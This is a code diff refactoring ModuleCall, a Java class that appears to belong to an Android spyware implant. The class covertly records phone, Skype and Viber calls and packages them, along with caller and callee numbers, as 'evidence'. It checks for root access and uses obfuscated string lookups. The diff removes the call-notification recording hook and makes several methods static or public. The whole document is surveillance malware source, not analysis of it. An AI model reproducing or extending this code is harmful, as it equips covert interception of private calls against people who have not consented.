@@ -57,18 +57,18 @@ import java.util.List;
 import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.LinkedBlockingQueue;
 
-public class ModuleCall extends BaseModule implements Observer<Call> {
+public class ModuleCall extends BaseModule   {
 	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
-	private static final int HEADER_SIZE = 6;
+	public static final int HEADER_SIZE = 6;
 
 	public boolean recordFlag;
 
 	private static final int CHANNEL_LOCAL = 0;
 	private static final int CHANNEL_REMOTE = 1;
 
-	private static final int CALLIST_PHONE = 0x0;
-	private static final int CALLIST_SKYPE = 0x1;
-	private static final int CALLIST_VIBER = 0x2;
+	public static final int CALLIST_PHONE = 0x0;
+	public static final int CALLIST_SKYPE = 0x1;
+	public static final int CALLIST_VIBER = 0x2;
 
 	// From audio.h, Android 4.x
 	private static final int AUDIO_STREAM_VOICE_CALL = 0;
@@ -89,7 +89,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
 	public static final byte[] MP4_HEADER = new byte[]{0, 0, 0};
 
-	int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};
+	public static int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};
 	private RunningProcesses runningProcesses;
 	private CallInfo callInfo;
 	private List<Chunk> chunks = new ArrayList<Chunk>();
@@ -100,6 +100,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	public static ModuleCall self() {
 		return (ModuleCall) ManagerModule.self().get(M.e("call"));
+	}
+
+	public boolean isRecordFlag() {
+		return recordFlag;
 	}
 
 	@Override
@@ -127,10 +131,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	@Override
 	public void actualStart() {
 		isStarted=false;
-		ListenerCall.self().attach(this);
-
 		runningProcesses = RunningProcesses.self();
-		callInfo = new CallInfo();
+		callInfo = new CallInfo(false);
 
 		if (recordFlag) {
 			if (Cfg.DEBUG) {
@@ -219,8 +221,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	@Override
 	public void actualStop() {
-		ListenerCall.self().detach(this);
-
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualStop");
+		}
 		if (Status.haveRoot()) {
 			if (queueMonitor != null && queueMonitor.isAlive()) {
 				encodingTask.stop();
@@ -421,54 +424,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return true;
 	}
 
-	public int notification(final Call call) {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (notification): " + call);//$NON-NLS-1$
-		}
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG
-					+ " (notification): number: " + call.getNumber() + " in:" + call.isIncoming() + " runn:" + isRunning()); //$NON-NLS-1$
-		}
-
-		if (call.isOffhook() == false) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): call not yet established"); //$NON-NLS-1$
-			}
-			return 0;
-		}
-
-		final boolean incoming = call.isIncoming();
-		boolean recording = false;
-
-		try {
-			// Let's start with call recording
-			if (recordFlag && RecordCall.self().isSupported(this)) {
-				recording = RecordCall.self().recordCall(this, call, incoming);
-			}
-		} catch (Exception ex) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " ERROR (notification), ", ex);
-			}
-		}
-
-		if (!recordFlag && !call.isOngoing()) {
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): Saving CallList evidence"); //$NON-NLS-1$
-			}
-
-			String from = call.getFrom();
-			String to = call.getTo();
-
-			saveCalllistEvidence(CALLIST_PHONE, from, to, incoming, call.getTimeBegin(), call.getDuration());
-		}
-
-		return 0;
-	}
-
-	public boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
-	                                String currentRecordFile, boolean autoClose, int channel, int programId) {
+	public static boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
+	                                       String currentRecordFile, boolean autoClose, int channel, int programId) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveCallEvidence): " + " peer: " + peer + " from: " + dateBegin + " to: " + dateEnd
 					+ " incoming: " + incoming);
@@ -534,7 +492,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		EvidenceBuilder.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 	}
 
-	private int checkIntegrity(byte[] data) {
+	private static int checkIntegrity(byte[] data) {
 		int pos = 0;
 		int chunklen = 0;
 
@@ -553,8 +511,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return pos;
 	}
 
-	private byte[] getCallAdditionalData(String peer, String myNumber, boolean incoming, DateTime dateBegin,
-	                                     DateTime dateEnd, int channels, int programId) {
+	private static byte[] getCallAdditionalData(String peer, String myNumber, boolean incoming, DateTime dateBegin,
+	                                            DateTime dateEnd, int channels, int programId) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (getCallAdditionalData): caller: " + peer + " callee: " + myNumber);
 		}
@@ -608,8 +566,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return additionaldata;
 	}
 
-	private void saveCalllistEvidence(int programId, String from, String to, boolean incoming, Date fromTime,
-	                                  int duration) {
+	public void saveCalllistEvidence(int programId, String from, String to, boolean incoming, Date fromTime,
+	                                 int duration) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveCalllistEvidence):  from: " + from + " to: " + to);
 		}
@@ -701,7 +659,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				closeCallEvidence(callInfo.getCaller(), callInfo.getCallee(), true, callInfo.begin, callInfo.end, callInfo.programId);
 			}
 
-			callInfo = new CallInfo();
+			callInfo = new CallInfo(false);
 			for (Chunk chunk : chunks) {
 				AutoFile filetmp = new AutoFile(chunk.encodedFile);
 				filetmp.delete();
@@ -807,7 +765,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 						if (callInfo.valid)
 							closeCallEvidence(caller, callee, true, callInfo.begin, callInfo.end, callInfo.programId);
 					}
-					callInfo = new CallInfo();
+					callInfo = new CallInfo(false);
 					chunks = new ArrayList<Chunk>();
 					finished = new boolean[2];
 					started = false;
